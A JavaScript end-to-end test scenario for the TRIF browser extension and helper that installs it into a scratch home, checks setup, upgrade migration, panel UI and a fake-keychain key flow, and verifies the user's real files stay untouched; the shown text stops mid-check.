'use strict';
// One e2e scenario: install TRIF into a scratch home (fresh, or upgrading from an older release), start a
// throwaway browser connected to that home's helper, and check the whole chain. See docs/TESTING.md.

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { sleep, waitFor, run, runAsync, pidsMatching, killMatching } = require('./lib/util');
const I = require('./lib/install');
const { FirefoxDriver } = require('./lib/firefox');
const { ChromeDriver } = require('./lib/chrome');
const { SWEEP_EXPECT } = require('./lib/server');
const { makeFakeKeychain } = require('../fake-keychain');

const REAL_HOME = os.userInfo().homedir;
const SHIPPED_IDS = require('../../helper/lib/preinstalled').PREINSTALLED.map((p) => p.id || p);
const { RETIRED } = require('../../helper/lib/preinstalled');

// Files of the real setup the suite must never change: checked before and after (read only).
const REAL_FILES = [
  path.join(REAL_HOME, 'Library/Application Support/Mozilla/NativeMessagingHosts/com.webmods.helper.json'),
  path.join(REAL_HOME, 'Library/Application Support/Google/Chrome/NativeMessagingHosts/com.webmods.helper.json'),
  path.join(REAL_HOME, '.trif/config.json'),
  path.join(REAL_HOME, '.webmods/config.json'),
  path.join(REAL_HOME, 'Library/Application Support/TRIF/config.json'), // the real private folder (0.2.0)
  // (Not the real helper.log: the user's own helper writes it whenever their TRIF is in use, run or not.)
];
function fingerprint(files) {
  return files.map((f) => {
    try { const st = fs.lstatSync(f); return `${f} ${st.mtimeMs} ${crypto.createHash('sha1').update(fs.readFileSync(f)).digest('hex')}`; } catch { return `${f} -`; }
  }).join('\n');
}

const BANNER_MOD = `// ==WebMod==
// @name        E2E Banner
// @description Written by the e2e harness: marks the page and changes #target
// @match       *://127.0.0.1/*
// @run-at      document-start
// ==/WebMod==
document.documentElement.dataset.trifE2e = 'ran';
const apply = () => { const t = document.getElementById('target'); if (t) t.textContent = 'Changed by the E2E Banner mod.'; };
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', apply); else apply();
`;
const OFF_SITE_MOD = `// ==WebMod==
// @name        E2E Off Site
// @description Written by the e2e harness for localhost, where TRIF stays off: must never run
// ==/WebMod==
document.documentElement.dataset.trifE2eOff = 'ran';
`;
const USER_MOD = `// ==WebMod==
// @name        E2E User Mod
// @description A mod the user wrote before upgrading (e2e harness)
// @match       *://127.0.0.1/*
// ==/WebMod==
document.documentElement.dataset.trifE2eUser = 'ran';
`;

// The gate's top bar: the status dot, the robot (asleep) and settings.
const GATE_BAR = ['#dot', '#bar-robot', '#settings-btn'];

class Scenario {
  /**
   * opts: { browser: 'firefox'|'chrome', kind: 'fresh'|'upgrade', work, newTgz, oldTgz, results, servers,
   *         agent, codex, headless, extensionDirFirefox }
   */
  constructor(opts) {
    this.o = opts;
    this.r = opts.results;
    this.work = opts.work;
    this.home = path.join(this.work, 'h'); // the scratch HOME
    this.trif = path.join(this.home, '.trif');
    // TRIF's private folder (settings, logs, run logs, screenshots), where setup puts it for the scratch
    // home's ~/.trif. The helper for agent runs gets the real HOME, so it's told this one (TRIF_PRIVATE).
    this.priv = path.join(this.home, 'Library', 'Application Support', 'TRIF');
    this.label = `${opts.browser}-${opts.kind}${opts.oldTgz ? `-${path.basename(opts.oldTgz).replace(/\.tgz$/, '').replace(/^\D+-/, '')}` : ''}`;
    this.shots = 0;
  }

  // ---- helpers

  // (Without --oss, the fake keychain from the unit tests, in the work folder: the real Keychain is never
  // asked about API keys, and the panel's key row can be tried for real.)
  keychain() {
    if (!this._keychain) this._keychain = makeFakeKeychain(path.join(this.work, 'keychain'));
    return this._keychain;
  }

  env(extra) { return I.scratchEnv(this.home, { ...(this.o.oss ? {} : { TRIF_KEYCHAIN_BIN: this.keychain().bin }), ...extra }); }

  /** Runs the installed `trif` (the scratch home's wrapper). */
  async cli(args, { json = false, timeoutMs = 60000, env = undefined } = {}) {
    const r = await runAsync(path.join(this.trif, 'bin', 'trif'), [...args, ...(json ? ['--json'] : [])], { env: this.env(env), cwd: this.home, timeoutMs });
    if (json) {
      try { return { ...r, json: JSON.parse(r.stdout) }; } catch { return { ...r, json: null }; }
    }
    return r;
  }

  async shot(ctx, name) {
    const file = this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-${name}.png`);
    try { await this.d.screenshot(ctx, file); } catch (e) { this.r.note(`screenshot ${name} failed: ${e.message}`); }
    return file;
  }

  /** The setup page's checklist: each step done / now / later / hidden, and what the open one says. */
  async setupState() {
    return this.ext(`async () => {
      const q = (s) => document.querySelector(s);
      const step = (id) => { const e = q('#step-' + id); return e.hidden ? 'hidden' : ['done', 'now', 'later'].find((c) => e.classList.contains(c)) || '?'; };
      return { docTitle: document.title, title: q('#title').textContent, sub: q('#sub').textContent,
        steps: ['helper', 'browser', 'scripts', 'login', 'try'].map(step),
        states: [...document.querySelectorAll('.step.done .state')].map((e) => e.textContent),
        now: q('.step.now')?.innerText.trim() || '',
        buttons: [...document.querySelectorAll('.step.now .body button')].map((b) => b.textContent) };
    }`);
  }

  async waitSetup(what, pred, timeoutMs = 20000) {
    let last = null;
    try {
      return await waitFor(`the setup page: ${what}`, async () => { last = await this.setupState(); return pred(last) ? last : null; }, { timeoutMs });
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  /**
   * The setup page all ticked: the agent can run (here: an API key for Claude Code in the scratch keychain,
   * which counts as logged in; taken out again after). Then "TRIF is ready" and Try it, with the sites
   * where a mod TRIF comes with is on.
   */
  async setupDoneCheck() {
    const st = await this.setupState();
    let keyed = false;
    if (st.steps[3] !== 'done') {
      const set = run(path.join(this.trif, 'bin', 'trif'), ['agent', 'key', '--agent', 'claude', '--set-key'], { env: this.env(), cwd: this.home, input: 'sk-ant-e2e-not-a-real-key-0000\n' });
      if (set.status !== 0) throw new Error(`trif agent key --set-key: ${set.stderr || set.stdout}`);
      keyed = true;
    }
    try {
      // (The helper keeps an agent's login state for 30 s; the page asks every 5.)
      const x = await this.waitSetup('all ticked', (s) => s.steps.join() === 'done,done,done,done,now' && s.title === 'TRIF is ready', 60000);
      // Try it: a button for each site where a shipped mod is on and TRIF is on for the site (x.com's Detox Timeline).
      if (x.sub !== 'Open any website, click the TRIF icon, and ask for a change.' || !x.buttons.includes('Open x.com')
        || !x.buttons.every((b) => /^Open [\w-]+(\.[\w-]+)+$/.test(b))) throw new Error(JSON.stringify(x));
      await this.shot(this.control, 'setup-page-done');
      return `"${x.title}"; ${x.buttons.join(', ')}`;
    } finally {
      if (keyed) run(path.join(this.trif, 'bin', 'trif'), ['agent', 'key', '--agent', 'claude', '--remove-key'], { env: this.env(), cwd: this.home });
    }
  }

  /** Runs `fn` in the extension's own setup page, which has the chrome.* APIs. */
  ext(fn, args = []) { return this.d.eval(this.control, fn, args); }

  page(fn, args = []) { return this.d.eval(this.pageCtx, fn, args); }
  panel(fn, args = []) { return this.d.eval(this.panelCtx, fn, args); }

  async pageState() {
    return this.page(`async () => ({
      url: location.href,
      ready: document.readyState,
      banner: document.documentElement.dataset.trifE2e || null,
      off: document.documentElement.dataset.trifE2eOff || null,
      user: document.documentElement.dataset.trifE2eUser || null,
      target: document.getElementById('target')?.textContent || null,
      text: document.documentElement.innerText.slice(0, 2000), // all of it: a mod may add to <html> itself
    })`);
  }

  async panelState() {
    return this.panel(`async () => {
      const q = (s) => document.querySelector(s);
      return {
        site: q('#site')?.textContent || '',
        gate: !q('#gate').hidden,
        gateText: q('#gate-btn')?.textContent || '',
        siteOn: q('#site-switch')?.getAttribute('aria-checked') === 'true',
        notice: q('#notice').hidden ? '' : q('#notice').innerText,
        dot: q('#dot')?.className || '',
        mods: [...document.querySelectorAll('#mod-list > li')].map((li) => ({
          id: li.dataset.mod,
          on: li.querySelector('button.switch')?.getAttribute('aria-checked') === 'true',
          running: !!li.querySelector('.light.on'),
          update: li.querySelector('.mod-update')?.innerText || null,
          source: li.querySelector('.mod-source')?.textContent || null,
        })),
      };
    }`);
  }

  /** Waits until the test page has (re)loaded and `pred(state)` holds. */
  async waitPage(what, pred, timeoutMs = 20000) {
    return waitFor(what, async () => {
      // The tab may be mid-navigation: find it again by URL each time.
      this.pageCtx = await this.d.findPage((u) => u.startsWith(this.pageUrlPrefix), { timeoutMs: 5000 });
      const s = await this.pageState();
      return s.ready !== 'loading' && pred(s) ? s : null;
    }, { timeoutMs });
  }

  async waitPanel(what, pred, timeoutMs = 20000) {
    return waitFor(what, async () => { const s = await this.panelState(); return pred(s) ? s : null; }, { timeoutMs });
  }

  /** The panel's top bar: what shows in it, and how the robot in the middle looks and is labelled. */
  async barState() {
    return this.panel(`async () => {
      const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
      const robot = document.querySelector('#bar-robot');
      const look = robot ? getComputedStyle(robot.querySelector('svg')) : null;
      return {
        bar: shown('.bar'),
        shown: ['#dot', '#site', '#bar-robot', '#site-switch', '#new-chat', '#settings-btn'].filter(shown),
        robotButton: robot?.tagName === 'BUTTON' && robot.tabIndex >= 0,
        robotLabel: robot?.getAttribute('aria-label') || '',
        switchLabel: document.querySelector('#site-switch')?.getAttribute('aria-label') || '',
        filter: look?.filter || '', opacity: look ? Number(look.opacity) : null, hovered: !!robot?.matches(':hover'),
      };
    }`);
  }

  /** Waits until the top bar shows exactly `want` (selectors, in bar order) and `pred(bar)` holds. */
  async waitBar(what, want, pred = () => true) {
    let last = null;
    try {
      return await waitFor(what, async () => {
        last = await this.barState();
        return last.bar && last.shown.join(' ') === want.join(' ') && pred(last) ? last : null;
      }, { timeoutMs: 10000 });
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  // The robot asleep in the bar: grey and dim (the eyes still there); with the mouse on him, a little
  // brighter, still asleep; awake: in colour.
  static grey(b) { return Number((/grayscale\(([\d.]+)\)/.exec(b.filter) || [])[1] || 0); }
  static dim(b) { return !b.hovered && Scenario.grey(b) === 1 && b.opacity <= 0.6; } // 0.45 dark, 0.6 light
  static stirring(b) { return b.hovered && Scenario.grey(b) > 0 && Scenario.grey(b) < 1 && b.opacity > 0.5 && b.opacity < 1; }
  static awake(b) { return b.filter === 'none' && b.opacity === 1; }

  /** Settings open from the bar (wherever it is: the gate, the landing page), work, and close again. */
  async settingsOpen(name) {
    await this.d.click(this.panelCtx, '#settings-btn');
    let last = null;
    const s = await waitFor('settings to open, with the agents and instructions from the helper', async () => {
      last = await this.panel(`async () => {
        const e = document.querySelector('#settings');
        return { open: !!e && e.getClientRects().length > 0, expanded: document.querySelector('#settings-btn').getAttribute('aria-expanded'),
          agents: document.querySelectorAll('#agent option').length, instructions: !document.querySelector('#instructions').disabled,
          update: document.querySelector('#update-note').textContent };
      }`);
      return last.open && last.expanded === 'true' && last.agents > 1 && last.instructions ? last : null;
    }, { timeoutMs: 10000 }).catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    await sleep(300);
    await this.shot(this.panelCtx, name);
    await this.d.click(this.panelCtx, '#settings-btn');
    await waitFor('settings to close', async () => this.panel(`async () => document.querySelector('#settings').hidden`), { timeoutMs: 5000 });
    return `${s.agents - 1} agents listed, instructions loaded; "${s.update}"`;
  }

  /**
   * Settings → Open model → OpenRouter: a key saved (in the fake keychain) shows as "✓ Saved" with Replace
   * and Remove instead of the field; Replace brings the field back with Cancel; Remove empties the
   * keychain. The agent and provider are put back afterwards.
   */
  async openModelKey() {
    const kc = this.keychain();
    const KEY = 'sk-or-v1-e2e-not-a-real-key-0000';
    await this.d.click(this.panelCtx, '#settings-btn');
    await waitFor('settings to open', async () => this.panel(`async () => !document.querySelector('#settings').hidden && document.querySelectorAll('#agent option').length > 1`), { timeoutMs: 10000 });
    const before = await this.panel(`async () => ({ agent: document.querySelector('#agent').value, oss: !!document.querySelector('#agent option[value="codex-oss"]') })`);
    if (!before.oss) { await this.d.click(this.panelCtx, '#settings-btn'); return 'skipped: no open model agent listed (Codex not installed?)'; }
    const pick = (sel, value) => this.panel(`async (sel, value) => { const e = document.querySelector(sel); e.value = value; e.dispatchEvent(new Event('change', { bubbles: true })); return e.value; }`, [sel, value]);
    const row = () => this.panel(`async () => {
      const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
      return { row: shown('#om-key-row'), saved: shown('#om-key-saved'), edit: shown('#om-key-edit'), cancel: shown('#om-key-cancel'),
        field: document.querySelector('#om-key').value, focused: document.activeElement?.id || '', status: document.querySelector('#om-key-status').textContent,
        provider: document.querySelector('#om-provider').value };
    }`);
    let last = null;
    const until = (what, ok) => waitFor(what, async () => { last = await row(); return ok(last) ? last : null; }, { timeoutMs: 10000 })
      .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    await pick('#agent', 'codex-oss');
    await until('the open model settings', (x) => !!x.provider);
    const provider = last.provider;
    await pick('#om-provider', 'openrouter');
    await until('the key field (no key yet)', (x) => x.provider === 'openrouter' && x.row && x.edit && !x.saved && !x.cancel);
    await this.panel(`async (k) => { const e = document.querySelector('#om-key'); e.value = k; e.dispatchEvent(new Event('input', { bubbles: true })); }`, [KEY]);
    await this.d.click(this.panelCtx, '#om-key-save');
    const saved = await until('"✓ Saved" with Replace and Remove', (x) => x.saved && !x.edit && x.field === '');
    if (!Object.values(kc.items()).includes(KEY)) throw new Error(`the key isn't in the keychain: ${JSON.stringify(Object.keys(kc.items()))}`);
    await this.d.click(this.panelCtx, '#om-key-replace');
    await until('the field again, with Cancel, focused', (x) => x.edit && x.cancel && !x.saved && x.focused === 'om-key');
    await this.shot(this.panelCtx, 'panel-open-model-key-replace');
    await this.d.click(this.panelCtx, '#om-key-cancel');
    await until('back to "✓ Saved"', (x) => x.saved && !x.edit);
    await this.shot(this.panelCtx, 'panel-open-model-key-saved');
    await this.d.click(this.panelCtx, '#om-key-remove');
    await until('the field (key removed)', (x) => x.edit && !x.saved && !x.cancel);
    if (Object.values(kc.items()).includes(KEY)) throw new Error('Remove left the key in the keychain');
    await pick('#om-provider', provider);
    await pick('#agent', before.agent);
    await this.d.click(this.panelCtx, '#settings-btn');
    return `saved ("${saved.status.slice(0, 60)}…"), replace and cancel, removed; agent and provider (${provider}) put back`;
  }

  // ---- the scenario

  async run() {
    const t0 = Date.now();
    const r = this.r;
    r.setGroup(`${this.o.browser} ${this.o.kind}${this.o.kind === 'upgrade' ? ` from ${path.basename(this.o.oldTgz)}` : ''}`);
    fs.rmSync(this.work, { recursive: true, force: true });
    this._keychain = null;
    fs.mkdirSync(this.home, { recursive: true });
    const before = fingerprint(REAL_FILES);
    try {
      const installed = await r.check('install from the npm package into a scratch home', () => this.install());
      if (!installed) return;
      const started = await r.check('browser starts with the extension, isolated to the scratch helper', () => this.startBrowser());
      if (started) await this.browserChecks();
    } finally {
      if (this.d && this.d.proc) {
        await r.check('console: no warnings or errors from the extension or pages', () => this.consoleCheck());
        await this.d.stop().catch((e) => r.note(`stopping the browser: ${e.message}`));
      }
      await r.check('helper log: no warnings or errors', () => this.helperLogCheck());
      const leaked = await killMatching(this.work + '/');
      if (leaked) r.note(`killed ${leaked} leftover process(es) using ${this.work}`);
      await r.check('real browser setup untouched (native host manifests, ~/.trif, ~/.webmods)', async () => {
        const after = fingerprint(REAL_FILES);
        if (after !== before) throw new Error(`changed:\n${after}`);
        return 'unchanged';
      });
      r.note(`${this.label} took ${((Date.now() - t0) / 1000).toFixed(0)} s`);
    }
  }

  async install() {
    const o = this.o;
    const pkg = I.unpack(o.newTgz, path.join(this.work, 'pkg'));
    const browserArg = o.browser;
    if (o.kind === 'fresh') {
      const s = I.runSetup(pkg, this.home, ['--browser', browserArg]);
      this.r.log(s.out);
      if (s.status !== 0) throw new Error(`setup exited ${s.status}:\n${s.out.split('\n').slice(-15).join('\n')}`);
    } else {
      const oldPkg = I.unpack(o.oldTgz, path.join(this.work, 'oldpkg'));
      const s0 = I.runSetup(oldPkg, this.home, ['--browser', I.oldBrowserArg(oldPkg, browserArg)]);
      this.r.log(s0.out);
      if (s0.status !== 0) throw new Error(`the old release's setup exited ${s0.status}:\n${s0.out.split('\n').slice(-15).join('\n')}`);
      const legacy = path.join(this.home, '.webmods');
      if (!fs.existsSync(path.join(legacy, 'sites'))) throw new Error(`the old setup made no ${legacy}/sites`);
      // The user's own mod, and an edit to a shipped one, before upgrading.
      fs.mkdirSync(path.join(legacy, 'sites', '127.0.0.1'), { recursive: true });
      fs.writeFileSync(path.join(legacy, 'sites', '127.0.0.1', 'e2e-user.js'), USER_MOD);
      const shipped = path.join(legacy, 'sites', 'x.com', 'punk-fonts.js');
      fs.appendFileSync(shipped, '\n// e2e: the user changed this shipped mod\n');
      this.r.note(I.ensureShippedUpdate(oldPkg, pkg, 'x.com/punk-fonts'));
      // The way a 0.1.x helper's updater runs the new version's setup (--home ~/.webmods).
      const s = I.runSetup(pkg, this.home, ['--home', legacy, '--browser', browserArg]);
      this.r.log(s.out);
      if (s.status !== 0) throw new Error(`setup exited ${s.status}:\n${s.out.split('\n').slice(-15).join('\n')}`);
      await this.r.check('upgrade: ~/.webmods moved to ~/.trif, link left behind', () => {
        const st = fs.lstatSync(legacy);
        if (!st.isSymbolicLink()) throw new Error('~/.webmods is not a link');
        if (fs.realpathSync(legacy) !== fs.realpathSync(this.trif)) throw new Error(`~/.webmods points at ${fs.readlinkSync(legacy)}`);
        return `~/.webmods -> ${fs.readlinkSync(legacy)}`;
      });
      await this.r.check('upgrade: TRIF\'s private files moved out of the workspace', () => {
        const left = ['config.json', 'runs', 'helper.log', 'screenshots', 'safari-token'].filter((f) => fs.existsSync(path.join(this.trif, f)));
        if (left.length) throw new Error(`still in the workspace: ${left.join(', ')}`);
        if (!fs.existsSync(path.join(this.priv, 'config.json'))) throw new Error(`no config.json in ${this.priv}`);
        return `config.json and the rest in ${path.relative(this.home, this.priv)}`;
      });
      await this.r.check('upgrade: the user\'s own mod kept', () => {
        if (!fs.existsSync(path.join(this.trif, 'sites', '127.0.0.1', 'e2e-user.js'))) throw new Error('sites/127.0.0.1/e2e-user.js is gone');
      });
      await this.r.check('upgrade: the edited shipped mod kept, new version waiting', () => {
        const text = fs.readFileSync(path.join(this.trif, 'sites', 'x.com', 'punk-fonts.js'), 'utf8');
        if (!text.includes('the user changed this shipped mod')) throw new Error('the user\'s edit is gone');
        const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
        const rec = (pre.shipped || {})['x.com/punk-fonts'];
        if (!rec || !rec.pending) throw new Error(`no pending update recorded: ${JSON.stringify(rec)}`);
        if (!/new version waiting/.test(s.out)) throw new Error('setup didn\'t say a new version is waiting');
        return `pending version ${rec.pending.version}`;
      });
      // The shipped mods 0.2.0 folded into others (preinstalled.js RETIRED), unchanged here: in the trash.
      const retired = RETIRED.filter((x) => fs.existsSync(path.join(oldPkg, 'examples', 'sites', `${x.id}.js`)));
      if (retired.length) {
        await this.r.check('upgrade: the shipped mods folded into others went to the trash', () => {
          const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
          for (const { id, into } of retired) {
            if (fs.existsSync(path.join(this.trif, 'sites', `${id}.js`))) throw new Error(`${id} is still in sites`);
            const rec = (pre.shipped || {})[id];
            if (!rec || !rec.retired || rec.retired.into !== into || !rec.retired.trashed) throw new Error(`${id}: ${JSON.stringify(rec)}`);
            if (!fs.existsSync(path.join(this.trif, 'trash', id.split('/')[0], rec.retired.trashed))) throw new Error(`${id} isn't in the trash`);
          }
          return retired.map((x) => `${x.id.split('/')[1]} -> ${x.into.split('/')[1]}`).join(', ');
        });
      }
    }
    // Where setup put the browser's native host manifest: inside the scratch home.
    const manifest = o.browser === 'firefox'
      ? path.join(this.home, 'Library/Application Support/Mozilla/NativeMessagingHosts/com.webmods.helper.json')
      : path.join(this.home, 'Library/Application Support/Google/Chrome/NativeMessagingHosts/com.webmods.helper.json');
    const m = I.readJson(manifest);
    if (!m) throw new Error(`no manifest at ${manifest}`);
    if (m.path !== path.join(this.trif, 'bin', 'trif-host')) throw new Error(`manifest path is ${m.path}`);
    if (!fs.existsSync(path.join(this.trif, 'app', 'extension', 'manifest.json'))) throw new Error('no app/extension in the scratch home');
    // The harness's own mods, and config: no update checks (hermetic), and a canary the agent must not read.
    fs.mkdirSync(path.join(this.trif, 'sites', '127.0.0.1'), { recursive: true });
    fs.mkdirSync(path.join(this.trif, 'sites', 'localhost'), { recursive: true });
    fs.writeFileSync(path.join(this.trif, 'sites', '127.0.0.1', 'e2e-banner.js'), BANNER_MOD);
    fs.writeFileSync(path.join(this.trif, 'sites', 'localhost', 'e2e-off.js'), OFF_SITE_MOD);
    const cfgFile = path.join(this.priv, 'config.json');
    if (fs.existsSync(path.join(this.trif, 'config.json'))) throw new Error('setup left a config.json in the workspace');
    const cfg = I.readJson(cfgFile) || {};
    this.canary = `canary-${crypto.randomBytes(6).toString('hex')}`;
    Object.assign(cfg, { checkForUpdates: false, e2eCanary: this.canary });
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    return `${o.kind === 'fresh' ? 'setup' : 'old setup, then new setup'} ok; manifest ${path.relative(this.home, manifest)}`;
  }

  async startBrowser() {
    const o = this.o;
    // The helper inherits the browser's environment. HOME=<scratch> keeps everything in the scratch home;
    // for agent runs, which need your real Claude Code / Codex login, the browser (and so the helper and
    // the agents it starts) gets your real HOME, and TRIF_HOME points the helper at the scratch workspace.
    const env = o.agent || o.codex || o.oss || o.guidance ? { HOME: REAL_HOME, TRIF_HOME: this.trif, TRIF_PRIVATE: this.priv } : { HOME: this.home };
    // The real Keychain only for --oss (the OpenRouter key the user saved); otherwise the fake one, so the
    // helper never looks up API keys for Claude Code or Codex in the real one.
    if (!o.oss) env.TRIF_KEYCHAIN_BIN = this.keychain().bin;
    this.helperHome = env.HOME;
    if (o.browser === 'firefox') {
      this.d = new FirefoxDriver({
        profile: path.join(this.work, 'profile'), home: env.HOME, env,
        nativeDir: path.join(this.home, 'Library/Application Support/Mozilla'),
        extensionDir: o.extensionDirFirefox, headless: o.headless,
      });
    } else {
      this.d = new ChromeDriver({
        userDataDir: path.join(this.home, 'Library/Application Support/Google/Chrome'), home: env.HOME, env,
        extensionDir: path.join(this.trif, 'app', 'extension'), headless: o.headless,
      });
    }
    await this.d.start();
    const iso = await this.d.isolateNativeMessaging();
    this.r.log(`native messaging manifests read from: ${JSON.stringify(iso)}`);
    await this.d.installExtension();
    const st = await waitFor('the helper to answer `trif status`', async () => {
      const s = await this.cli(['status'], { json: true, timeoutMs: 15000 });
      return s.json && s.json.extension ? s.json : null;
    }, { timeoutMs: 30000 });
    this.helperPid = st.helper.pid;
    // The helper must be one started from the scratch home.
    const proc = pidsMatching('host.js').find((p) => p.pid === this.helperPid);
    if (!proc || !proc.command.includes(this.trif)) throw new Error(`the helper (pid ${this.helperPid}) isn't the scratch one: ${proc && proc.command}`);
    if (!fs.existsSync(path.join(this.trif, `helper-${this.helperPid}.sock`))) throw new Error('no helper socket in the scratch home');
    // No helper from anywhere else was started by this browser.
    const strays = pidsMatching('host.js').filter((p) => !p.command.includes(this.work) && run('/bin/ps', ['-o', 'ppid=', '-p', String(p.pid)]).stdout.trim() === String(this.d.proc.pid));
    if (strays.length) throw new Error(`this browser started a helper outside the scratch home: ${strays.map((p) => p.command).join('; ')}`);
    return `${this.d.name} ${this.d.version}; helper pid ${this.helperPid} (${(proc.command.match(/\S*host\.js/) || [proc.command])[0]})`;
  }

  async browserChecks() {
    const r = this.r;
    const d = this.d;
    const { port, tlsPort, timeline } = this.o.servers;
    const origin = d.origin;

    // The setup page: our handle on the extension's chrome.* APIs, and the user scripts permission.
    this.control = await d.openTab(`${origin}/onboarding.html`);
    await r.check('setup page: a checklist, the helper and the browser ticked, user scripts next', async () => {
      const x = await this.waitSetup('step 3 open', (st) => st.steps.join() === 'done,done,now,later,later');
      if (x.docTitle !== 'TRIF setup' || x.title !== 'Set up TRIF' || x.states.join() !== 'connected,done') throw new Error(JSON.stringify(x));
      const want = d.name === 'Firefox' ? /Firefox asks before an add-on runs them\.[\s\S]*Allow user scripts/ : /One switch:[\s\S]*flip this[\s\S]*Open TRIF’s Chrome settings/;
      if (!want.test(x.now)) throw new Error(`step 3 says: ${x.now}`);
      await this.shot(this.control, 'setup-page-scripts-off');
      return x.now.split('\n').slice(0, 2).join(' / ');
    });
    const allowed = await r.check('user scripts allowed', async () => {
      const how = await d.grantUserScripts(this.control);
      await waitFor('status.userScripts', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts, { timeoutMs: 20000 });
      return how;
    });
    if (allowed) {
      await r.check('setup page: user scripts ticked by themselves; the agent\'s login next', async () => {
        const x = await this.waitSetup('step 4 open', (st) => (st.steps.join() === 'done,done,done,now,later' && /\n\n/.test(st.now) && !/Checking your coding agent/.test(st.now))
          || st.steps.join() === 'done,done,done,done,now');
        if (x.steps[3] === 'now' && !/isn’t logged in on this computer yet|couldn’t tell whether .* is logged in|needs a coding agent|isn’t available/.test(x.now)) throw new Error(`step 4 says: ${x.now}`);
        await this.shot(this.control, 'setup-page-login');
        return x.steps[3] === 'now' ? x.now.split('\n').slice(0, 2).join(' / ') : 'the agent is logged in already';
      });
    }

    const connected = await r.check('helper connected (trif status, extension hello)', async () => {
      const s = (await this.cli(['status'], { json: true })).json;
      const e = s.extension;
      if (!e) throw new Error('no extension status');
      if (e.browser !== d.name) throw new Error(`extension says it's in ${e.browser}`);
      return `helper v${s.helper.helper}, extension v${e.version} on ${e.browser} ${e.chrome}, user scripts ${e.userScripts ? 'on' : 'off'}`;
    });

    if (!connected) return;
    await r.check('trif doctor', async () => {
      const doc = await this.cli(['doctor'], { json: true, timeoutMs: 60000 });
      if (!doc.json) throw new Error(`no JSON: ${doc.stdout} ${doc.stderr}`);
      r.log(JSON.stringify(doc.json, null, 2));
      const fails = doc.json.checks.filter((c) => c.status === 'fail');
      // Expected in the scratch home: the CLI isn't on PATH (setup ran with --no-link), and the agents
      // aren't logged in there (doctor runs with HOME=<scratch>; their logins are in your real home).
      const expected = (c) => /not on your PATH|isn't logged in/.test(c.title);
      const warns = doc.json.checks.filter((c) => c.status === 'warn' && !expected(c));
      const connected = doc.json.checks.find((c) => /helper|extension/i.test(c.title) && c.status === 'ok');
      if (fails.length) throw new Error(fails.map((c) => c.title).join('; '));
      if (!connected) throw new Error('doctor has no passing helper/extension check');
      return warns.length ? { status: 'warn', detail: `warnings: ${warns.map((c) => c.title).join('; ')}` } : `${doc.json.checks.length} checks ok`;
    });

    await r.check('shipped mods present and recognised (trif mods, trif status)', async () => {
      const mods = (await this.cli(['mods'], { json: true })).json;
      const list = Array.isArray(mods) ? mods : (mods && (mods.mods || [])) || [];
      const shipped = list.filter((m) => m.source === 'webmods' || m.source === 'trif');
      // Every mod TRIF ships is there; each is marked as shipped (@source), except a copy the user edited
      // before 0.1.2, when the shipped mods had no @source line yet.
      const ids = new Set(list.map((m) => m.id));
      const missing = SHIPPED_IDS.filter((id) => !ids.has(id));
      if (missing.length) throw new Error(`missing: ${missing.join(', ')}`);
      const unmarked = SHIPPED_IDS.filter((id) => !shipped.some((m) => m.id === id) && !(this.o.kind === 'upgrade' && id === 'x.com/punk-fonts'));
      if (unmarked.length) throw new Error(`not recognised as shipped: ${unmarked.join(', ')}`);
      const st = (await this.cli(['status'], { json: true })).json.extension;
      const byId = new Map(st.mods.map((m) => [m.id, m]));
      const px = byId.get('x.com/detox-timeline');
      if (!px || px.enabled === false) throw new Error(`x.com/detox-timeline not on: ${JSON.stringify(px)}`);
      const pf = byId.get('x.com/punk-fonts');
      if (!pf || pf.enabled !== false) throw new Error(`x.com/punk-fonts should start off: ${JSON.stringify(pf)}`);
      for (const s of ['google.com', 'x.com', 'amazon.com', 'instagram.com']) if (!(st.sitesOn || []).includes(s)) throw new Error(`TRIF isn't on for ${s}: ${st.sitesOn}`);
      if (this.o.kind === 'upgrade') {
        const u = list.find((m) => m.id === 'x.com/punk-fonts');
        if (!u || !u.update) throw new Error(`trif mods shows no update for x.com/punk-fonts: ${JSON.stringify(u)}`);
        // The retired mods' switches were handed to the mods they went into (once; both on here).
        const gone = RETIRED.filter((x) => !ids.has(x.id) && ((I.readJson(path.join(this.trif, 'preinstalled.json')) || {}).shipped || {})[x.id]?.retired?.trashed);
        const { absorbed = {} } = await this.ext(`async () => chrome.storage.local.get('absorbed')`);
        const missed = gone.filter((x) => absorbed[x.id] !== true || byId.get(x.into)?.enabled === false);
        if (missed.length) throw new Error(`switches not carried over for ${missed.map((x) => x.id).join(', ')}: absorbed ${JSON.stringify(absorbed)}`);
      }
      return `${shipped.length} shipped (${shipped.filter((m) => byId.get(m.id)?.enabled !== false).length} on), sites on: ${st.sitesOn.join(', ')}`;
    });

    if (!allowed) { r.note('user scripts are off, so the page checks were skipped'); return; }

    // ---- the test window and the panel following it
    const base = `http://127.0.0.1:${port}`;
    this.pageUrlPrefix = base;
    const win = await this.ext(`async (url) => { const w = await chrome.windows.create({ url, width: 1100, height: 850, focused: true }); return { windowId: w.id, tabId: w.tabs[0].id }; }`, [`${base}/?e2e=1`]);
    this.win = win;
    await this.waitPage('the test page', (s) => s.ready === 'complete');
    await this.ext(`async (url, win) => { await chrome.windows.create({ url, width: 420, height: 900 }); }`, [`${origin}/sidepanel.html?window=${win.windowId}`, win.windowId]);
    this.panelCtx = await d.findPage('sidepanel.html');

    await r.check('site off by default: the mod doesn\'t run, the panel shows the gate', async () => {
      const s = await this.pageState();
      if (s.banner) throw new Error('the mod ran on a site TRIF is off for');
      const p = await this.waitPanel('the panel to show the gate', (x) => x.site === '127.0.0.1' && x.gate);
      return `panel: "${p.gateText}"`;
    });
    await r.check('gate: the top bar keeps only the dot, the robot, grey and dim, and settings', async () => {
      const b = await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
      if (!b.robotButton) throw new Error('the robot isn\'t a focusable button');
